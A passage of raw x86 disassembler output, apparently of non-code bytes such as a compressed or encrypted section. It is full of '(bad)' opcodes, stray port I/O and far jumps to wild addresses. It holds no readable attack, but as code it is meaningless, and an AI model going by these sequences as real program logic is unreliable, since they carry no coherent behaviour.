  422041:	jno    0x42203a
  422043:	or     eax,0x45c468da
  422048:	mov    esp,0xd26603d8
  42204d:	and    BYTE PTR [ebp+0x614f19f],dl
  422053:	jp     0x42201f
  422055:	lds    edi,FWORD PTR [edi+0x6362a17c]
  42205b:	ror    ebp,1
  42205d:	div    BYTE PTR [ebx]
  42205f:	cmp    bl,0xb
  422062:	enter  0x9e28,0xd9
  422066:	ins    BYTE PTR es:[edi],dx
  422067:	(bad)  
  422068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422069:	sahf   
  42206a:	add    ch,ah
  42206c:	push   0x3c
  42206e:	scas   eax,DWORD PTR es:[edi]
  42206f:	mov    ds:0x633cf730,eax
  422074:	mov    cl,0xf6
  422076:	sti    
  422077:	nop
  422078:	xchg   esi,eax
  422079:	xor    DWORD PTR [ecx+0x117d85e1],esp
  42207f:	pop    ebx
  422080:	or     dh,ch
  422082:	mov    gs:0xf47cffae,eax
  422088:	jle    0x422071
  42208a:	sub    eax,0x5f1b8a3f
  42208f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422090:	push   cs
  422091:	jnp    0x422080
  422093:	mov    cl,0xe2
  422095:	scas   eax,DWORD PTR es:[edi]
  422096:	jecxz  0x4220aa
  422098:	rcl    BYTE PTR [esi],cl
  42209a:	and    BYTE PTR [ebp-0x69],dh
  42209d:	push   ebx
  42209e:	cmp    BYTE PTR [eax+0x4b48e3a4],cl
  4220a4:	adc    al,0x7a
  4220a6:	scas   eax,DWORD PTR es:[edi]
  4220a7:	dec    edi
  4220a8:	xor    ecx,DWORD PTR [ebp-0x4c]
  4220ab:	or     cl,BYTE PTR [edx-0x2]
  4220ae:	mov    bl,bl
  4220b0:	(bad)  
  4220b1:	cmp    al,0xf3
  4220b3:	push   ebp
  4220b4:	xor    al,BYTE PTR [ecx-0x62]
  4220b7:	jle    0x4220ce
  4220b9:	in     al,dx
  4220ba:	mov    esi,0x5935ca76
  4220bf:	enter  0x848e,0xd3
  4220c3:	scas   eax,DWORD PTR es:[edi]
  4220c4:	pop    edi
  4220c5:	xchg   edi,eax
  4220c6:	inc    eax
  4220c7:	pop    ebx
  4220c8:	mov    al,0x8d
  4220ca:	int    0xc1
  4220cc:	mov    al,ds:0x351ad30d
  4220d1:	test   BYTE PTR [esi],al
  4220d3:	sub    DWORD PTR [esi-0x10],ebx
  4220d6:	xor    DWORD PTR ds:0xe3ded4c5,esp
  4220dc:	sbb    eax,0xb1a6d195
  4220e1:	daa    
  4220e2:	sbb    eax,0x6a0ecdec
  4220e7:	clc    
  4220e8:	mov    ebp,0x145a8bbd
  4220ed:	gs inc ecx
  4220ef:	js     0x422161
  4220f1:	xor    ebx,esp
  4220f3:	retf   
  4220f4:	hlt    
  4220f5:	push   ds
  4220f6:	and    al,0x5
  4220f8:	(bad)  
  4220f9:	jmp    0x6217:0x418e0d43
  422100:	mov    edi,0x93b32416
  422105:	pop    es
  422106:	retf   0x2f45
  422109:	xchg   edi,eax
  42210a:	outs   dx,BYTE PTR ds:[esi]
  42210b:	je     0x4220f9
  42210d:	sbb    esi,0xc8404566
  422113:	cmc    
  422114:	loope  0x42212a
  422116:	inc    esp
  422117:	mov    ch,0x83
  422119:	fadd   QWORD PTR [ecx+0xaba1622]
  42211f:	add    DWORD PTR [eax],esi
  422121:	call   0x9d85a1ac
  422126:	mov    ds:0x5d3ee238,al
  42212b:	cdq    
  42212c:	sub    al,0x3
  42212e:	cld    
  42212f:	sbb    DWORD PTR [edx+0x18],ebx
  422132:	cmp    al,0xdd
  422134:	cmp    al,0x29
  422136:	jns    0x4220e5
  422138:	and    DWORD PTR [ebx+edx*2+0x41],edx
  42213c:	mov    dl,0x3f
  42213e:	retf   0x6758
  422141:	out    0xd,eax
  422143:	add    eax,0x75a52bbf
  422148:	sahf   
  422149:	or     DWORD PTR [esi-0xd],ecx
  42214c:	lea    edi,[eax-0x799236f3]
  422152:	cmp    DWORD PTR [ebx+0x3d8bf84a],eax
  422158:	dec    eax
  422159:	addr16 sahf 
  42215b:	and    BYTE PTR [ebx],cl
  42215d:	inc    edx
  42215e:	out    0x66,eax
  422160:	adc    eax,0xf74a11d0
  422165:	test   BYTE PTR [edx],ch
  422167:	loope  0x4220fc
  422169:	cmp    BYTE PTR [edx-0x1b],ah
  42216c:	mov    fs,WORD PTR [ebx+eax*1]
  42216f:	popf   
  422170:	test   DWORD PTR [edi-0x153cf520],esp
  422176:	mov    al,ds:0x79167e87
  42217b:	inc    eax
  42217c:	bound  ebp,QWORD PTR [ecx+ebx*8+0x36849168]
  422183:	sub    edi,eax
  422185:	sti    
  422186:	mov    DWORD PTR [ebp+0x79],0x95ff49cf
  42218d:	dec    bh
  42218f:	add    BYTE PTR [ecx+0x2e],dh
  422192:	shl    ebp,0x32
  422195:	pop    esi
  422196:	dec    esp
  422197:	inc    ebp
  422198:	cmc    
  422199:	lods   eax,DWORD PTR ds:[esi]
  42219a:	clc    
  42219b:	rcl    DWORD PTR [ebp+0x7eb6ef9],cl
  4221a1:	shl    ecx,cl
  4221a3:	scas   al,BYTE PTR es:[edi]
  4221a4:	pop    ss
  4221a5:	jbe    0x422224
  4221a7:	(bad)  
  4221a8:	sahf   
  4221a9:	out    0xba,eax
  4221ab:	mov    ecx,DWORD PTR [edx]
  4221ad:	mov    ecx,0x40cda823
  4221b2:	fnstcw WORD PTR [edx]
  4221b4:	retf   
  4221b5:	out    0x36,al
  4221b7:	int    0x91
  4221b9:	pop    eax
  4221ba:	push   es
  4221bb:	lock cmp bl,BYTE PTR [ebx+0x2d03b62]
  4221c2:	pop    eax
  4221c3:	mov    es,edi
  4221c5:	mov    WORD PTR [edi+esi*1+0x4d],fs
  4221c9:	fmul   DWORD PTR [esi]
  4221cb:	jg     0x42220f
  4221cd:	jmp    0x4f212bda
  4221d2:	std    
  4221d3:	add    cl,BYTE PTR [esi]
  4221d5:	shr    BYTE PTR [edx],1
  4221d7:	pop    eax
  4221d8:	jge    0x422259
  4221da:	addr16 imul eax,DWORD PTR [di-0x2e1a],0xffffffe8
  4221e1:	les    edi,FWORD PTR [ecx]
  4221e3:	adc    eax,0x1fe7f83f
  4221e8:	fdivr  st,st(4)
  4221ea:	out    0xe1,eax
  4221ec:	call   DWORD PTR [ebp-0x6a]
  4221ef:	ja     0x4221a7
  4221f1:	loope  0x4221a7
  4221f3:	sub    eax,0x86d7cf94
  4221f8:	jo     0x422198
  4221fa:	dec    esi
  4221fb:	fldenv [eax+0x4e]
  4221fe:	sub    eax,0x1c4f8304
  422203:	repz jl 0x42224f
  422206:	push   ss
  422207:	icebp  
  422208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422209:	mov    WORD PTR [edi-0x3d],es
  42220c:	sub    al,0x12
  42220e:	sbb    eax,DWORD PTR [ecx+0x50811947]
  422214:	add    eax,DWORD PTR [ebx-0x14]
  422217:	test   DWORD PTR [esi-0x10d40fb7],0x31b121fc
  422221:	cwde   
  422222:	aad    0x92
  422224:	stos   BYTE PTR es:[edi],al
  422225:	sar    DWORD PTR [edx+edx*4],0xc3
  422229:	push   ss
  42222a:	sbb    esp,DWORD PTR [ecx+0x40]
  42222d:	cmp    ecx,DWORD PTR ds:0xcf6a1795
  422233:	mov    eax,ds:0xeb39f3a
  422238:	iret   
  422239:	xchg   edx,eax
  42223a:	repnz ror BYTE PTR [ebp-0x21],1
  42223e:	jp     0x4221e9
  422240:	cmp    DWORD PTR [edi+esi*8+0x635d903e],edx
  422247:	out    0xcf,eax
  422249:	mov    cl,0xe9
  42224b:	push   eax
  42224c:	push   es
  42224d:	or     edi,DWORD PTR [ecx]
  42224f:	loopne 0x4221fe
  422251:	into   
  422252:	sbb    bh,ah
  422254:	push   es
  422255:	push   0x39021b99
  42225a:	push   es
  42225b:	pop    edi
  42225c:	and    edi,DWORD PTR [ecx+0x3472ea3a]
  422262:	ds int3 
  422264:	add    eax,0xab72fad6
  422269:	and    esi,esp
  42226b:	jmp    0x4222a2
  42226d:	jge    0x42223c
  42226f:	dec    esp
  422270:	mov    al,BYTE PTR [edx+0x30fa6af2]
  422276:	mov    ebp,0x432065fc
  42227b:	cwde   
  42227c:	push   ebx
  42227d:	adc    eax,0xc643be51
  422282:	mov    ds:0xc7cd18d6,eax
  422287:	pop    edi
  422288:	add    DWORD PTR [ecx-0x372eb114],edi
  42228e:	mov    al,ds:0x45a1207d
  422293:	lock cmp BYTE PTR [eax-0x52],bl
  422297:	xlat   BYTE PTR ds:[ebx]
  422298:	imul   edi,DWORD PTR [edx],0xa862dc8e
  42229e:	push   0x5e
  4222a0:	xchg   ecx,ebp
  4222a2:	jo     0x42225a
  4222a4:	nop
  4222a5:	dec    edi
  4222a6:	loop   0x4222c1
  4222a8:	mov    WORD PTR [edx+0x72],cs
  4222ab:	fisubr WORD PTR [edi-0x77]
  4222ae:	(bad)  
  4222af:	lods   eax,DWORD PTR ds:[esi]
  4222b0:	dec    si
  4222b2:	test   eax,0x7be66b7b
  4222b7:	fs loopne 0x422289
  4222ba:	mov    dl,0x3f
  4222bc:	xor    BYTE PTR [eax*2+0x6164048d],cl
  4222c3:	xor    dh,dh
  4222c5:	mov    ds:0xc09a9eea,al
  4222ca:	clc    
  4222cb:	push   edx
  4222cc:	or     ch,BYTE PTR [eax-0x1ff93f54]
  4222d2:	jle    0x422259
  4222d4:	sub    esi,DWORD PTR [ebp+eax*2-0x2a]
  4222d8:	dec    esi
  4222d9:	enter  0xb263,0x96
  4222dd:	xchg   esp,eax
  4222de:	test   DWORD PTR [edi+0x40],ecx
  4222e1:	in     al,0xb4
  4222e3:	dec    edi
  4222e4:	mov    esi,0x7f9f4e4f
  4222e9:	fdivr  st(5),st
  4222eb:	dec    edx
  4222ec:	pop    ecx
  4222ed:	aad    0xc4
  4222ef:	inc    ecx
  4222f0:	rol    ch,cl
  4222f2:	fmul   DWORD PTR [ebx-0x2a]
  4222f5:	mov    eax,ds:0xf59345ea
  4222fa:	jnp    0x422343
  4222fc:	xor    dh,dh
  4222fe:	scas   al,BYTE PTR es:[edi]
  4222ff:	xchg   ebp,eax
  422300:	loope  0x4222dd
  422302:	dec    ebx
  422303:	mov    WORD PTR [edx],es
  422305:	or     ah,BYTE PTR [ebx+0x35dcbc4d]
  42230b:	rcl    DWORD PTR [esi+0x2c8b21e4],cl
  422311:	(bad)  
  422312:	loope  0x4222fd
  422314:	out    dx,eax
  422315:	mov    dh,0x2a
  422317:	or     bh,BYTE PTR [esi+0x15]
  42231a:	clc    
  42231b:	adc    DWORD PTR [edi+0x79a5cf23],0xffffffe5
  422322:	cmp    dh,BYTE PTR [esi-0xc]
  422325:	push   ss
  422326:	sti    
  422327:	push   edi
  422328:	dec    edx
  422329:	xchg   ecx,eax
  42232a:	add    eax,0x868ea9a
  42232f:	into   
  422330:	cmp    al,0x44
  422332:	in     al,dx
  422333:	loopne 0x422344
  422335:	xor    al,0x4f
  422337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422338:	rcl    BYTE PTR [edx-0x7],0xc1
  42233c:	jnp    0x4222c2
  42233e:	jp     0x4223bc
  422340:	fistp  DWORD PTR [ebx-0x1]
  422343:	stos   DWORD PTR es:[edi],eax
  422344:	es ret 0xcb62
  422348:	leave  
  422349:	repnz xchg ecx,eax
  42234b:	jb     0x4223cb
  42234d:	add    ebx,DWORD PTR [ebx+0x23bace8d]
  422353:	jle    0x42234f
  422355:	repz push esp
  422357:	pop    esi
  422358:	je     0x422322
  42235a:	fild   QWORD PTR [eax]
  42235c:	and    al,0x29
  42235e:	cwde   
  42235f:	inc    edx
  422360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422361:	ret    0x8d4d
  422364:	mov    dl,0x33
  422366:	jo     0x42233d
  422368:	cwde   
  422369:	ja     0x42231c
  42236b:	jb     0x4223cd
  42236d:	cwde   
  42236e:	out    0xb6,eax
  422370:	jo     0x42234d
  422372:	scas   eax,DWORD PTR es:[edi]
  422373:	push   eax
  422374:	icebp  
  422375:	xlat   BYTE PTR ds:[ebx]
  422376:	sbb    al,bl
  422378:	mov    BYTE PTR [ebx+0x43cdbc8a],bh
  42237e:	xchg   esp,eax
  42237f:	inc    edx
  422380:	loopne 0x422324
  422382:	and    DWORD PTR [esi-0x70],edx
  422385:	xchg   esp,eax
  422386:	repnz inc edx
  422388:	or     eax,0xc3d214c5
  42238d:	add    eax,ebp
  42238f:	xchg   BYTE PTR [eax-0x43],bl
  422392:	clc    
  422393:	push   esi
  422394:	fs rcl esi,1
  422397:	xchg   edx,eax
  422398:	retf   0xaa29
  42239b:	xchg   ebx,eax
  42239c:	mov    al,0x34
  42239e:	rcr    esp,0x62
  4223a1:	or     al,0xde
  4223a3:	mov    dl,0x48
  4223a5:	sbb    DWORD PTR [ebp+0x5c],esi
  4223a8:	sub    DWORD PTR [esi+0x4f],ecx
  4223ab:	inc    edi
  4223ac:	mov    ds:0xd6be312,eax
  4223b1:	jmp    0x7ec0:0x805684
  4223b8:	out    dx,al
  4223b9:	cmp    BYTE PTR [edi+0x3a],bh
  4223bc:	dec    eax
  4223bd:	das    
  4223be:	add    edi,esi
  4223c0:	mov    al,0x9e
  4223c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223c3:	js     0x422366
  4223c5:	(bad)  
  4223c7:	out    dx,eax
  4223c8:	loop   0x4223c9
  4223ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223cb:	jmp    0x51d7f09a
  4223d0:	xchg   edi,eax
  4223d1:	mov    WORD PTR [esi-0x3b],ss
  4223d4:	jmp    0x4223f9
  4223d6:	call   0xd522:0xf5c6dc9a
  4223dd:	jne    0x422376
  4223df:	add    dh,bl
  4223e1:	out    0xcb,eax
  4223e3:	test   DWORD PTR ds:[edx],esp
  4223e6:	jecxz  0x422448
  4223e8:	(bad)  
  4223ea:	rol    bh,cl
  4223ec:	xchg   ecx,eax
  4223ed:	test   eax,0xd2503246
  4223f2:	pop    ebx
  4223f3:	mov    bl,0x59
  4223f5:	or     DWORD PTR ds:[eax+0x44],ebp
  4223f9:	inc    ecx
  4223fa:	lahf   
  4223fb:	faddp  st(3),st
  4223fd:	jne    0x422468
  4223ff:	jcxz   0x422412
  422402:	mov    ah,0x57
  422404:	and    DWORD PTR [ecx-0x51],0xa440a04d
  42240b:	xchg   BYTE PTR [eax-0x742c959d],dh
  422411:	mov    ds:0xdedf7131,eax
  422416:	test   bh,0x4a
  422419:	mov    ch,dh
  42241b:	outs   dx,DWORD PTR ds:[esi]
  42241c:	xor    eax,0x410ac45f
  422421:	not    BYTE PTR [esi+esi*4]
  422424:	sahf   
  422425:	mov    bl,0x19
  422427:	mov    WORD PTR ds:0xc9672b7c,ss
  42242d:	icebp  
  42242e:	dec    eax
  42242f:	lock out 0xdf,eax
  422432:	pop    ss
  422433:	inc    ecx
  422434:	inc    ebx
  422435:	mov    ?,ebp
  422437:	js     0x42248a
  422439:	push   cs
  42243a:	sbb    esp,DWORD PTR [edi-0xab7825]
  422440:	popf   
  422441:	hlt    
  422442:	sahf   
  422443:	jne    0x4223f9
  422445:	jge    0x422470
  422447:	mov    bh,0x60
  422449:	xlat   BYTE PTR ds:[ebx]
  42244a:	add    dl,dh
  42244c:	sub    eax,0xa8731d1
  422451:	add    DWORD PTR [edi+0x51],esi
  422454:	or     eax,0x1a176ac3
  422459:	icebp  
  42245a:	jmp    0xb6a6bb6e
  42245f:	idiv   ebx
  422461:	add    ah,BYTE PTR [eax-0x7f]
  422464:	test   DWORD PTR [ebp+eiz*1-0x4b60c8af],ebx
  42246b:	call   0x4ee3:0x9bb3de6c
  422472:	inc    edi
  422473:	cmp    eax,0xbb1fb6c5
  422478:	lds    edx,FWORD PTR [esi+ebp*4]
  42247b:	xor    DWORD PTR [ebx+0x6e049375],ebx
  422481:	sub    edx,DWORD PTR [ebx]
  422483:	mov    ds:0x9d39d34b,al
  422488:	jns    0x4224eb
  42248a:	fstp   TBYTE PTR [ebp+0x6]
  42248d:	and    eax,0xf62841c
  422492:	add    ch,dl
  422494:	mov    esp,0x661fee05
  422499:	xchg   BYTE PTR [ecx+0x5a],dl
  42249c:	in     al,0xc3
  42249e:	mov    edx,0xc424483c
  4224a3:	xchg   esi,eax
  4224a4:	bound  eax,QWORD PTR [ecx+0x3348c4d]
  4224aa:	cmp    BYTE PTR [ebx-0x79ffc3b3],dh
  4224b0:	add    eax,0xc61c7b03
  4224b5:	or     dh,BYTE PTR [esi]
  4224b7:	mov    al,0x21
  4224b9:	adc    eax,0xc4f9275d
  4224be:	add    BYTE PTR ds:0x27efd2a1,al
  4224c4:	call   0xd500:0xda1ee9e7
  4224cb:	mov    ebx,0xc704f441
  4224d0:	mul    BYTE PTR [ecx-0x6]
  4224d3:	cwde   
  4224d4:	in     al,dx
  4224d5:	call   0x924fa168
  4224da:	mov    ch,0xba
  4224dc:	add    DWORD PTR [ebp-0x63307a11],edi
  4224e2:	out    dx,al
  4224e3:	imul   edx,DWORD PTR [edi-0x6c],0x49
  4224e7:	xor    edi,DWORD PTR [edx+0x15e5d58e]
  4224ed:	xchg   ebx,eax
  4224ee:	pop    ebx
  4224ef:	adc    al,0x1b
  4224f1:	jp     0x422487
  4224f3:	dec    esi
  4224f4:	xchg   ebp,eax
  4224f5:	dec    ebx
  4224f6:	add    DWORD PTR [edx-0x41],edi
  4224f9:	cmp    bh,ch
  4224fb:	outs   dx,DWORD PTR ds:[esi]
  4224fc:	shl    BYTE PTR [edi+0x403a474b],1
  422502:	xchg   DWORD PTR [ecx-0x4233839a],ebx
  422508:	push   ecx
  422509:	dec    edi
  42250a:	dec    bl
  42250c:	or     edx,DWORD PTR [edx-0x4987bd89]
  422512:	add    esi,DWORD PTR [edi]
  422514:	jbe    0x42252f
  422516:	add    al,0xdb
  422518:	imul   edi,DWORD PTR ds:0x44815f70,0xfffffffb
  42251f:	lods   al,BYTE PTR ds:[esi]
  422520:	pop    ss
  422521:	adc    cl,BYTE PTR [edi+0x7e]
  422524:	sub    eax,ecx
  422526:	add    dh,BYTE PTR [ebp-0x6f]
  422529:	(bad)  
  42252a:	cmp    eax,0x4fa686f4
  42252f:	stos   DWORD PTR es:[edi],eax
  422530:	scas   eax,DWORD PTR es:[edi]
  422531:	mov    esi,0xf8068119
  422536:	mov    ebp,0xc9692f97
  42253b:	stos   BYTE PTR es:[edi],al
  42253c:	xchg   DWORD PTR [ebx-0x39],edx
  42253f:	add    al,0xd8
  422541:	cmp    al,0x7d
  422544:	pop    ds
  422545:	mov    WORD PTR [esp+eiz*8-0x37efcd7d],gs
  42254c:	add    ebx,ecx
  42254e:	in     al,dx
  42254f:	in     al,dx
  422550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422551:	gs int3 
  422553:	push   ecx
  422554:	imul   ebx,DWORD PTR [eax-0x20],0xd051285f
  42255b:	mov    eax,DWORD PTR [edi]
  42255d:	xchg   esp,eax
  42255e:	fisubr DWORD PTR [eax-0x3ca1fa32]
  422564:	test   BYTE PTR [ebp+0x76982a51],al
  42256a:	mov    edi,0x75f6ce6e
  42256f:	scas   eax,DWORD PTR es:[edi]
  422570:	mov    esp,0xb333c307
  422575:	pushf  
  422576:	jl     0x4225f6
  422578:	or     BYTE PTR [edx-0x2ce39bd9],dl
  42257e:	ja     0x4225fa
  422580:	(bad)  
  422582:	ret    
  422583:	jp     0x4225e5
  422585:	ret    0xacac
  422588:	mov    eax,ds:0xa17cafb5
  42258d:	cmp    DWORD PTR [ebx-0x52175b2c],ebp
  422593:	call   FWORD PTR [esi]
  422595:	xor    al,0xfe
  422597:	jnp    0x4225a6
  422599:	add    edx,DWORD PTR [edi-0xb3e5188]
  42259f:	icebp  
  4225a0:	pop    ds
  4225a1:	pop    edi
  4225a2:	ja     0x422606
  4225a4:	cmp    DWORD PTR [ebp-0xfae3aa8],ecx
  4225aa:	int3   
  4225ab:	cmp    al,BYTE PTR [eax-0x67e37341]
  4225b1:	rcr    DWORD PTR [ecx+0x57206335],0x17
  4225b8:	bound  ebx,QWORD PTR [esi-0x5a]
  4225bb:	xchg   edi,eax
  4225bc:	cs pop esi
  4225be:	sub    eax,0xa3f7ea80
  4225c3:	test   DWORD PTR [eax-0x3d],edx
  4225c6:	ja     0x42254e
  4225c8:	inc    ecx
  4225c9:	and    esi,eax
  4225cb:	shl    BYTE PTR [ebx-0x72],1
  4225ce:	inc    esp
  4225cf:	push   edx
  4225d0:	mov    esi,0x4629d7dd
  4225d5:	jae    0x422588
  4225d7:	mov    WORD PTR [ebx],gs
  4225d9:	es and al,0x3a
  4225dc:	and    dl,BYTE PTR [eax]
  4225de:	pop    ecx
  4225df:	inc    esp
  4225e0:	and    BYTE PTR [edx+0xd],bl
  4225e3:	or     eax,0x611bb96b
  4225e8:	or     bh,BYTE PTR [ebx+0x16927f16]
  4225ee:	xor    al,0x1f
  4225f0:	push   edi
  4225f1:	push   ebx
  4225f2:	lods   eax,DWORD PTR ds:[esi]
  4225f3:	jp     0x42265e
  4225f5:	and    DWORD PTR [ecx],esp
  4225f7:	pop    esp
  4225f8:	call   0xac7f:0xdf263b15
  4225ff:	inc    ebx
  422600:	lods   eax,DWORD PTR ds:[esi]
  422601:	push   edx
  422602:	sub    al,0x2f
  422604:	mov    esp,0x66328de2
  422609:	and    bl,al
  42260b:	or     bh,BYTE PTR [ecx]
  42260d:	enter  0x73e5,0x31
  422611:	push   es
  422612:	gs xchg edi,eax
  422614:	xchg   edx,eax
  422615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422616:	push   ds
  422617:	repnz sbb dl,ah
  42261a:	stos   BYTE PTR es:[edi],al
  42261b:	(bad)  
  42261c:	fidiv  DWORD PTR [edi]
  42261e:	stc    
  42261f:	mov    ?,WORD PTR [edx]
  422621:	data16 lock std 
  422624:	lods   eax,DWORD PTR ds:[esi]
  422625:	cmp    BYTE PTR [edx+esi*8-0x58ba697b],0xe9
  42262d:	ja     0x422677
  42262f:	xor    eax,0xfa234f98
  422634:	push   edx
  422635:	jle    0x42267b
  422637:	call   0x55d1:0xce202a22
  42263e:	sub    BYTE PTR [ebp-0x6fdb9d3d],bl
  422644:	dec    ecx
  422645:	push   esp
  422646:	xlat   BYTE PTR ds:[ebx]
  422647:	pop    es
  422648:	ins    BYTE PTR es:[edi],dx
  422649:	push   edi
  42264a:	js     0x4225d0
  42264c:	cmp    eax,0x15c3afa3
  422651:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422653:	stos   DWORD PTR es:[edi],eax
  422654:	mov    eax,ds:0xdaa870bd
  422659:	aam    0x69
  42265b:	mov    esp,0xe9cd7197
  422660:	xor    ebx,DWORD PTR [ebx]
  422662:	dec    edi
  422663:	bound  ecx,QWORD PTR [ecx-0x16]
  422666:	jmp    0x4226dd
  422668:	mov    esi,DWORD PTR [esi-0x20]
  42266b:	sti    
  42266c:	cmc    
  42266d:	(bad)  
  42266e:	adc    al,0x3a
  422670:	push   ebp
  422671:	out    dx,al
  422672:	shl    DWORD PTR [ebp+0x50705c0],0x42
  422679:	mov    BYTE PTR [eax+ebx*4],0x98
  42267d:	sbb    edx,ecx
  42267f:	xchg   ax,ax
  422681:	rcr    BYTE PTR [edi],1
  422683:	jne    0x42261a
  422685:	adc    esi,DWORD PTR [ebx-0x3c]
  422688:	mov    ebp,0xd135747d
  42268d:	fcmove st,st(7)
  42268f:	aad    0xca
  422691:	div    BYTE PTR [edi]
  422693:	imul   esp,DWORD PTR [ecx+0x37],0xc4adfd39
  42269a:	add    eax,0xdaa1b394
  42269f:	mov    ebx,0x8875dd34
  4226a4:	scas   eax,DWORD PTR es:[edi]
  4226a5:	scas   al,BYTE PTR es:[edi]
  4226a6:	in     al,dx
  4226a7:	cmp    eax,0xa24ce011
  4226ac:	add    BYTE PTR [ecx+0x7e],dh
  4226af:	or     eax,DWORD PTR [ebp+0x69]
  4226b2:	sbb    eax,0x7f576b5f
  4226b7:	pop    ds
  4226b8:	jp     0x4226bb
  4226ba:	cmp    ch,BYTE PTR [ebx+esi*1]
  4226bd:	jl     0x422728
  4226bf:	push   ss
  4226c0:	push   es
  4226c1:	dec    eax
  4226c2:	pop    ebx
  4226c3:	jnp    0x422688
  4226c5:	lahf   
  4226c6:	not    DWORD PTR [esi]
  4226c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c9:	lds    esi,FWORD PTR [ebp-0x1a]
  4226cc:	xor    cl,BYTE PTR [ecx-0x505acc44]
  4226d2:	xor    al,0xd1
  4226d4:	dec    edx
  4226d5:	jns    0x42269e
  4226d7:	(bad)  
  4226d8:	mov    esp,0x67333119
  4226dd:	fisubr DWORD PTR [ebx-0x1c]
  4226e0:	cwde   
  4226e1:	call   0x50d:0x2a39b385
  4226e8:	mov    bh,0x47
  4226ea:	pop    ecx
  4226eb:	out    dx,eax
  4226ec:	js     0x422725
  4226ee:	ret    0x27d1
  4226f1:	rol    DWORD PTR [edx+0x685df356],cl
  4226f7:	(bad)  
  4226f8:	hlt    
  4226f9:	pop    edx
  4226fa:	nop
  4226fb:	add    BYTE PTR [edx-0x58],0x68
  4226ff:	pop    edx
  422700:	scas   al,BYTE PTR es:[edi]
  422701:	push   ds
  422702:	xchg   edi,eax
  422703:	aas    
  422704:	aaa    
  422705:	mov    eax,0x10f8c8b
  42270a:	and    al,cl
  42270c:	not    al
  42270e:	loop   0x42278f
  422710:	(bad)  [ecx-0x3a]
  422713:	outs   dx,DWORD PTR ds:[esi]
  422714:	(bad)  
  422716:	adc    DWORD PTR [ecx+ecx*8],ecx
  422719:	xchg   esi,eax
  42271a:	inc    esp
  42271b:	outs   dx,DWORD PTR ds:[esi]
  42271c:	mov    ecx,0x89440075
  422721:	les    ebp,FWORD PTR [esi-0x4b]
  422724:	shl    bl,cl
  422726:	mov    cl,0x20
  422728:	(bad)  
  42272a:	adc    cl,BYTE PTR [edx+0x9287d23]
  422730:	iret   
  422731:	jmp    0xf933d3c4
  422736:	inc    esp
  422737:	mov    esi,0x8b045275
  42273c:	imul   eax,DWORD PTR [edx+edi*8+0x2d053292],0x70
  422744:	xlat   BYTE PTR ds:[ebx]
  422745:	sbb    al,0x80
  422747:	int3   
  422748:	mov    cl,0x37
  42274a:	and    BYTE PTR [eax],al
  42274c:	loope  0x422788
  42274e:	repnz pop eax
  422750:	mov    eax,ds:0x61888dd6
  422755:	ss sbb ah,0xc7
  422759:	cmp    DWORD PTR [edi+0x4588d00e],esi
  42275f:	adc    DWORD PTR [esi+0x45],ebp
  422762:	or     eax,0x928889de
  422767:	pushf  
  422768:	adc    eax,0x17762fad
  42276d:	(bad)  
  42276f:	in     eax,dx
  422770:	out    dx,eax
  422771:	out    dx,eax
  422772:	jmp    0x4227a8
  422774:	sbb    DWORD PTR [edi],edx
  422776:	lds    ebp,FWORD PTR [esi+0x22]
  422779:	cld    
  42277a:	mov    cl,0x8f
  42277c:	pop    ss
  42277d:	pusha  
  42277e:	jnp    0x4227a1
  422780:	add    al,dl
  422782:	sub    BYTE PTR [ecx-0x2b525283],dh
  422788:	in     eax,dx
  422789:	or     eax,DWORD PTR [esi]
  42278b:	cmp    bh,BYTE PTR [eax-0x5ad3807b]
  422791:	mov    esi,0xffc7ce0a
  422796:	popf   
  422797:	pop    ecx
  422798:	arpl   WORD PTR [eax+0x21],di
  42279b:	jge    0x4227e8
  42279d:	ins    BYTE PTR es:[edi],dx
  42279e:	shr    BYTE PTR [edi],0xb0
  4227a1:	sbb    edx,esp
  4227a3:	cli    
  4227a4:	adc    esp,DWORD PTR [ebx-0x57d42caf]
  4227aa:	pop    edx
  4227ab:	xor    ebx,DWORD PTR [edi-0x1f6f676]
  4227b1:	pop    ds
  4227b2:	pop    ebx
  4227b3:	jb     0x42280f
  4227b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227b7:	(bad)  [edx+esi*1+0x3aefadc]
  4227be:	dec    eax
  4227bf:	es sub bl,0xba
  4227c3:	loope  0x4227b8
  4227c5:	aam    0x75
  4227c7:	stos   DWORD PTR es:[edi],eax
  4227c8:	loop   0x42283b
  4227ca:	jno    0x4227b9
  4227cc:	clc    
  4227cd:	das    
  4227ce:	xchg   si,ax
  4227d0:	mov    esi,0x32370c92
  4227d5:	stos   DWORD PTR es:[edi],eax
  4227d6:	mov    esp,0xc781a449
  4227db:	icebp  
  4227dc:	adc    bl,BYTE PTR [edx+0x617d02ee]
  4227e2:	jmp    0x3f68832c
  4227e7:	mov    ebp,0xa26e24b7
  4227ec:	or     BYTE PTR [esi+0x667b13bd],al
  4227f2:	sbb    eax,0xd7c94960
  4227f7:	push   ebx
  4227f8:	mov    al,0x90
  4227fa:	loop   0x4227ee
  4227fc:	popa   
  4227fd:	rcr    dh,1
  4227ff:	jo     0x422793
  422801:	sbb    DWORD PTR [edx],ebp
  422803:	xchg   ebp,eax
  422804:	inc    esi
  422805:	jnp    0x422843
  422807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422808:	rcl    BYTE PTR ds:0x25418f3e,0x1c
  42280f:	mov    bl,0x3c
  422811:	or     DWORD PTR [esi+0x47],ebp
  422814:	fcmovnbe st,st(4)
  422816:	adc    eax,0x80745a2a
  42281b:	ficomp WORD PTR [ebp-0xddefb42]
  422821:	icebp  
  422822:	xchg   ecx,eax
  422823:	test   eax,0x36e88b94
  422828:	hlt    
  422829:	ror    esp,0x42
  42282c:	lods   eax,DWORD PTR ds:[esi]
  42282d:	frstor [ebx-0x5793f6c0]
  422833:	push   ds
  422834:	sub    al,0x37
  422836:	sti    
  422837:	into   
  422838:	hlt    
